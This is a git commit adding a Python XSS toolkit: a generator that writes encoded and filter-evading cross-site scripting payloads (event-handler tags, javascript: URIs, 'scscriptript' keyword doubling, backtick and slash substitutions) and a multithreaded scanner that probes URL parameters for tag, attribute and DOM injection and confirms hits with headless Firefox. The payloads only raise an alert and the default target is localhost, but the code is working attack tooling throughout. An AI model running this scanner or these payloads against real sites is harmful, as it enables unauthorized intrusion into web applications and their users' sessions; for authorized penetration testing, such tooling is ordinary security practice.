186cbe0d041f7bd01fd78a81e35c692b503871c0
PanDa1G1 <1214420849@qq.com>
2020-01-11 17:26:08 +0800

    xss

---
+++ xss/make_payload.py
@@ -0,0 +1,101 @@
+# -*- coding: UTF-8 -*-
+from urllib.parse import quote
+class make_payload():
+	
+	def __init__(self):
+
+		self.tag_file = "tag_payload.txt"
+		self.attribute_file = "attr_payload.txt"
+		self.payload="alert(668868)"
+		self.protocal = "javascript:"
+
+	def js_encode(self,sentence):
+		payload = ""
+		for char_ in sentence:
+			payload += "\\u00" + hex(ord(char_))[2:]
+		return payload
+
+	def html_encode(self,sentence):
+		payload = ""
+		for char_ in sentence:
+			payload += "&#x" + hex(ord(char_))[2:]
+		return payload
+
+
+	def url_encode(self,sentence):
+		payload = ""
+		for char_ in sentence:
+			payload += "%" + hex(ord(char_))[2:]
+		return payload
+
+	def make_tag(self):
+
+		payload_arr = ["<script>*;</script>","<img src=\"1\" onerror=*>","<svg onload=*>","<iframe src=\"http://baidu.com\" onload=*></iframe>","<details open ontoggle=\"*\">","<select autofocus onfocus=*>"
+						,"<marquee onstart=*>","<audio src onloadstart=*","<video src=\"_\" onloadstart=\"*\">","<video><source onerror=\"javascript:*\">","<keygen autofocus onfocus=*>"]
+		with open(self.tag_file,"w") as f:
+			for i in payload_arr:
+				tem_payload=self.js_encode(self.payload[:5])
+				f.write(i.replace("*",self.payload)+"\n")
+				f.write(i.replace("*",self.payload).replace(" ","/")+"\n")# 空格--> /
+				f.write(i.replace("*",self.payload).replace("(","`").replace(")","`")+"\n") #() ---> ``
+				#unicode 加密
+				f.write(i.replace("*",tem_payload+"(668868)").replace(" ","/")+"\n")
+				f.write(i.replace("*",tem_payload+"(668868)")+"\n")
+				f.write((i.replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`").replace(" ","/"))+"\n")
+				f.write((i.replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`"))+"\n")
+				#重叠
+				f.write(i.replace("script","scscriptript").replace("*",self.payload)+"\n")
+				f.write(i.replace("script","scscriptript").replace("*",self.payload).replace(" ","/")+"\n")# 空格--> /
+				f.write(i.replace("*",self.payload).replace("script","scscriptript").replace("(","`").replace(")","`")+"\n") #() ---> ``
+				f.write(i.replace("script","scscriptript").replace("*",tem_payload+"(668868)").replace(" ","/")+"\n")
+				f.write(i.replace("script","scscriptript").replace("*",tem_payload+"(668868)")+"\n")
+				f.write((i.replace("script","scscriptript").replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`").replace(" ","/"))+"\n")
+				f.write((i.replace("script","scscriptript").replace("*",tem_payload+"(668868)").replace("(","`").replace(")","`"))+"\n")
+
+	def make_attribute(self):
+
+		with open(self.attribute_file,"w") as f:
+			#on事件
+			f.write(self.payload+"\n")
+			f.write(self.html_encode(self.payload)+"\n")
+			f.write(self.html_encode(self.payload).replace("(","`").replace(")","`")+"\n")
+			f.write(self.js_encode(self.payload[:5])+"(668868)"+"\n")
+			f.write((self.js_encode(self.payload[:5])+"(668868)").replace("(","`").replace(")","`")+"\n")
+			f.write(self.html_encode(self.protocal + self.js_encode(self.payload[:5])+"(668868)")+"\n")
+			f.write(self.html_encode(self.protocal + self.js_encode(self.payload[:5])+"(668868)").replace("(","`").replace(")","`" + "\n"))
+			f.write("=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"(668868)"))
+			f.write("=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"`668868`"))
+			f.write("=location=\"{}{}\">\n".format(self.protocal,self.url_encode(self.payload)))
+			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"(668868)"))
+			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"`668868`"))
+			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.payload))
+			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"(668868)")))
+			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"`668868`")))
+			f.write("=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.url_encode(self.payload))))
+
+			#src等属性
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"(668868)"))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.protocal,self.js_encode(self.payload[:5])+"`668868`"))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.protocal,self.url_encode(self.payload)))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"(668868)"))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"`668868`"))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.url_encode(self.payload)))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"(668868)")))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"`668868`")))
+			f.write("\" onerror=location=\"{}{}\">\n".format(self.html_encode(self.protocal),self.html_encode(self.url_encode(self.payload))))
+
+			f.write("{}{}\n".format(self.protocal,self.js_encode(self.payload[:5])+"(668868)"  + ">"))
+			f.write("{}{}\n".format(self.protocal,self.js_encode(self.payload[:5])+"`668868`" + ">"))
+			f.write("{}{}\n".format(self.protocal,self.url_encode(self.payload)))
+			f.write("{}{}\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"(668868)" + ">"))
+			f.write("{}{}\n".format(self.html_encode(self.protocal),self.js_encode(self.payload[:5])+"`668868`" + ">"))
+			f.write("{}{}\n".format(self.html_encode(self.protocal),self.url_encode(self.payload) + ">"))
+			f.write("{}{}\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"(668868)" + ">")))
+			f.write("{}{}\n".format(self.html_encode(self.protocal),self.html_encode(self.js_encode(self.payload[:5])+"`668868`" + ">")))
+			f.write("{}{}\n".format(self.html_encode(self.protocal),self.html_encode(self.url_encode(self.payload + ">"))))
+
+
+if __name__ == '__main__':
+	a = make_payload()
+	#a.make_tag()
+	a.make_attribute()
---
+++ xss/xss_scan.py
@@ -0,0 +1,214 @@
+# -*- coding: UTF-8 -*-
+import requests
+import re
+import threading
+import queue
+from selenium import webdriver
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.common.alert import Alert
+import time
+from urllib.parse import quote
+import sys
+from colorama import Fore, Style, Back
+
+class xss_Scanner():
+	
+	def __init__(self,url,payload_num = 3,thread_num=50):
+		self.url = url
+		self.headers =  {
+		'User-agent': 'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8',
+		'Accept-Language': 'Zh-CN, zh;q=0.8, en-gb;q=0.8, en-us;q=0.8',
+		'Accept-Encoding': 'identity',
+		'Keep-Alive': '300',
+		'Connection': 'keep-alive',
+		'Cache-Control': 'max-age=0'
+		}
+		self.payload_num=payload_num
+		self.if_tags=0
+		self.if_attribute=0
+		self.if_dom=0
+		self.tem_payload = "~88868666~"
+		self.firefox_options=Options()
+		self.firefox_options.headless = True
+		self.queue_ = queue.Queue()
+		self.thread_num = thread_num
+		self.tem_payload_num=0
+		self.dom_arr=[]
+
+	def judge_tag(self):
+		payload = "<test0>"+ self.tem_payload + "</test0>"
+		url = self.url.replace("*",payload)
+		result = requests.get(url,headers = self.headers).text
+		#print("[1]" + result)
+		m = re.search(r"(<.*>)*[^\"]<test0>.*</test0>",result)
+		if m:
+			#print("aaa")
+			tag = m.group(1)
+			if tag:
+				#print("[3]"+tag)
+				self.if_tags=1
+				sys.stdout.write(Fore.LIGHTYELLOW_EX +"[*]tags can be injected\n")
+				return tag
+			else:
+				self.if_tags=1
+				sys.stdout.write(Fore.LIGHTYELLOW_EX +"[*]tags can be injected\n")
+				return 0
+		else:
+			return 0
+
+	def judge_attribute(self):
+		payload =self.tem_payload + "\">"
+		url = self.url.replace("*",payload)
+		result = requests.get(url,headers = self.headers).text
+		#print("[2]" + result)
+		m = re.search(r"<[a-z]+ ([a-z]*)=\"~88868666~\">",result)
+		if m:
+			attribute = m.group(1)
+			#print("[4]"+attribute)
+			self.if_attribute=1
+			sys.stdout.write(Fore.LIGHTYELLOW_EX +"[*]attribute can be injected\n")
+			return attribute
+		else:
+			return 0
+	def judge_dom(self):
+		url = self.url.replace("*",self.tem_payload)
+		result = requests.get(url,headers = self.headers).text
+		#print("[7]" + result)
+		if re.search("location.search",result):
+			self.dom_arr = re.findall("innerHTML|document.write",result)
+			self.dom_arr.append("location.search")
+			self.if_dom=1
+			sys.stdout.write(Fore.LIGHTYELLOW_EX +"[*]dom can be injected\n")
+			sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]finding: ")
+			for i in self.dom_arr:
+				sys.stdout.write(Fore.LIGHTGREEN_EX +"{}\t".format(i))
+	def payload_in_queue(self):
+		self.tag_pre = self.judge_tag();
+		self.pre_attribute = self.judge_attribute();
+		self.judge_dom()
+		if(self.if_tags == 1):
+			tag_dict = "xss/tag_payload.txt"
+			with open(tag_dict,"r") as f:
+				for payload in f:
+					self.queue_.put(payload.split("\n")[0])
+		if(self.if_attribute == 1):
+			tag_dict = "xss/attr_payload.txt"
+			with open(tag_dict,"r") as f:
+				for payload in f:
+					self.queue_.put(payload.split("\n")[0])
+		if(self.if_dom == 1):
+			tag_dict = "xss/dom_dict.txt"
+			with open(tag_dict,"r") as f:
+				for payload in f:
+					self.queue_.put(payload.split("\n")[0])
+
+	def tag_scan(self):
+		while not self.queue_.empty():
+			payload = self.queue_.get()
+			payload_ = quote(payload,"utf-8")
+			if self.tag_pre == 0:
+				url = self.url.replace("*",payload_)
+			elif re.match(r"title|textarea|math|iframe|xmp|plaintext",self.tag_pre[1:len(self.tag_pre)-1]):#闭合特殊标签
+				payload = self.tag_pre[0] + "/" + self.tag_pre[1:] + payload 
+				url = self.url.replace("*",payload_)
+			else:
+				url = self.url.replace("*",payload_)
+			browser = webdriver.Firefox(options=self.firefox_options)#options=self.firefox_options
+			try:
+				browser.get(url)
+				result = browser.switch_to.alert.text
+				if result == "668868":
+					sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]available payload {}\n".format(payload))
+					self.tem_payload_num +=1
+					#browser.close()
+					if self.tem_payload_num == self.payload_num:
+						sys.stdout.write(Fore.LIGHTYELLOW_EX + "[~]scan finished\n")
+						sys.exit(0)
+				else:
+					browser.close()
+			except:
+				browser.quit()
+				sys.exit(0)
+	def attribute_scan(self):
+		while not self.queue_.empty():
+			payload = self.queue_.get()
+			payload_ = quote(payload,"utf-8")
+			url = self.url.replace("*",payload_)
+			browser = webdriver.Firefox(options=self.firefox_options)
+			try:
+				browser.get(url)
+				result = browser.switch_to.alert.text
+				if result == "668868":
+					sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]available payload {}\n".format(payload))
+					self.tem_payload_num +=1
+					#browser.close()
+					if self.tem_payload_num == self.payload_num:
+						sys.stdout.write(Fore.LIGHTYELLOW_EX + "[~]scan finished\n")
+						sys.exit(0)
+				else:
+					browser.close()
+			except:
+				if self.tem_payload_num == self.payload_num:
+					browser.quit()
+					sys.exit(0)
+				continue
+	def dom_scan(self):
+		while not self.queue_.empty():
+			payload = self.queue_.get()
+			payload = quote(payload,"utf-8")
+			url = self.url.replace("*",payload)
+			browser = webdriver.Firefox(options=self.firefox_options)
+			try:
+				browser.get(url)
+				result = browser.switch_to.alert.text
+				if result == "668868":
+					sys.stdout.write(Fore.LIGHTGREEN_EX +"[*]available payload {}\n".format(payload))
+					self.tem_payload_num +=1
+					#browser.close()
+					if self.tem_payload_num == self.payload_num:
+						sys.stdout.write(Fore.LIGHTYELLOW_EX + "[~]scan finished\n")
+						sys.exit(0)
+				else:
+					browser.close()
+			except:
+				browser.quit()
+				sys.exit(0)
+
+	def run(self):
+		self.payload_in_queue()
+		#print("[5]%d" % self.if_attribute)
+		#print("[6]%d" % self.if_tags)
+		if self.if_attribute:
+			thread_ = []
+			for i in range(self.thread_num):
+				t = threading.Thread(target = self.attribute_scan())
+				thread_.append(t)
+				t.start()
+			for t in thread_: 
+				t.join()
+		if self.if_tags:
+			thread_ = []
+			for i in range(self.thread_num):
+				t = threading.Thread(target = self.tag_scan())
+				thread_.append(t)
+				t.start()
+			for t in thread_: 
+				t.join()
+		if self.if_dom:
+			thread_ = []
+			for i in range(self.thread_num):
+				t = threading.Thread(target = self.dom_scan())
+				thread_.append(t)
+				t.start()
+			for t in thread_: 
+				t.join()
+
+
+if __name__ == '__main__':
+	test = xss_Scanner("http://127.0.0.1/php/2.php?a=*")
+	test.run()
+	#test.judge_dom()
+	#test.dom_scan()
+
+
+
